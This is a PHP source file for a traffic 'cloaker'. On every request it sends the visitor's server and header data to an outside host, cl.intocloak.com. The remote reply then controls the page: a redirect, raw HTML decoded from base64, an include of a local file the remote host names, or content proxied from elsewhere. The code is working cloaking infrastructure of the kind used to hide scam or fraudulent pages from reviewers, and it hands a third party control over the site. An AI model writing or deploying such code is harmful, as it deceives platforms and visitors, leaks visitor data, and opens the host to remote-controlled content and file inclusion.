<?php
error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR);
class cloaker{
	public function __construct(){
        $this->defaultHeaders();
		$resultObj = (object) array('result' => false);
		
		$hash = str_replace('https','', $this->pfx($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']));
		$hash = str_replace('http','', $hash);
		$hash = str_replace('://','', $hash);
		$hash = str_replace('/','', $hash);
		$hash = str_replace('?','', $hash);
		$hash = str_replace('=','', $hash);
		$hash = str_replace('&','', $hash);
		$hash = str_replace('www.','', $hash);
		$hash = str_replace('.','', $hash);
		$hash = md5($hash.'nneepgii84');
		
		$url = "http://cl.intocloak.com/cloaker.php?n=".$hash;
        $ch = curl_init($url);
        $headers=array();
		
        foreach($_SERVER as $key=>$normalizedValue){
            if(is_array($normalizedValue)){
                $normalizedValue = implode(',', $normalizedValue);
            }
            $normalizedValue = trim(preg_replace('/\s+/', ' ', $normalizedValue));
            $smallHeader=strlen($normalizedValue)<1000;
            if ($smallHeader || $key == 'HTTP_USER_AGENT' || $key == 'HTTP_REFERER' || $key == 'QUERY_STRING' || $key == 'REQUEST_URI') {
               $headers[] = 'IM_'.$key.': '.$normalizedValue;
			   $pf['IM_'.$key] = $normalizedValue;
            } else {
                $headers[] = 'DG_'.$key.': '.strlen($normalizedValue);
            }
        }
		
		if (strlen($_GET['pCode']) > 4) {
			$pf['DG_pCode'] = $_GET['pCode'];
		}
		curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $FA = http_build_query($pf);
		curl_setopt($ch,CURLOPT_POST, 1);
		curl_setopt($ch,CURLOPT_POSTFIELDS, $FA);
        $output = json_decode(curl_exec($ch));
        $curl_error_number = curl_errno($ch);

        curl_close($ch);

		switch($output->code){
			case 0:
				$this->redict($output->page);
            break;
           	case 1:
				$this->html_page($output->page);
            break;
            case 2:
				$this->include_page($output->page);
            break;
            case 3:
				$this->load_content($output->page);
            break;
            case 4:
				$this->error($output->page);
            break;			
		}

	}
	
	function pfx($url) {
		
		$exp1 = explode('//',$url);

		$exp2 = explode('/',implode(",", $exp1));

		$veri = array_filter($exp2,'strlen');

		if (count($veri)-1 == 0) {
		return $url;	
		} else {
		if(preg_match('/^[a-zA-Z]+[a-zA-Z0-9_]+$/', $veri[count($veri)-1]))
		{
			for ($i = 0; $i <= count($veri); $i++) {
			$urlm.= $veri[$i];
			}
			return $urlm;

		}
		else
		{
			for ($i = 0; $i <= count($veri)-2; $i++) {
			$urlm.= $veri[$i];
			}
			return $urlm;
		}}
	}	
	
	function defaultHeaders(){
			if (!headers_sent())
				{  
        header("Cache-Control: no-cache, private, must-revalidate");
        header("Pragma: no-cache");
        header("Expires: 0");
				}
    }
	function include_page($link){
		if($link){
			if(file_exists($link)){
				include($link);
			}else $this->error("File not exist(check the link)");
		}else $this->error("You have not permission");
	}
    function redict($link){
		if (strlen($link)<3) {
			echo "ERROR : Redirect URL [Redr]";
		}
		
		  if (!headers_sent())
				{    
					header('HTTP/1.1 301 Moved Permanently'); 
					header('Location: '.$link);
					exit;
				}
			else
				{  
				echo '<script type="text/javascript">';
				echo 'window.location.href="'.$link.'";';
				echo '</script>';
				echo '<noscript>';
				echo '<meta http-equiv="refresh" content="0;url='.$link.'" />';
				echo '</noscript>'; exit;
			}
    }
	
    function html_page($cont){
		if (strlen($cont)<5) {
			echo "ERROR : HTML Content [html_page]";
		}
    	echo base64_decode($cont);
    }
    function load_content($link){
		if (strlen($link)<5) {
			echo "ERROR : Invalid URL [load_content]";
		}
		
		$ch = curl_init($link);
		curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 12);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 13);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		
		$homepage = curl_exec($ch);
		$homepage = str_replace('</head>','<base href="'.$link.'"/></head>',$homepage);
		curl_close($ch);
		echo $homepage;
    }	
	
	function error($err){
		echo "Error: ".$err;
	}
}
$cl= new cloaker();
?>
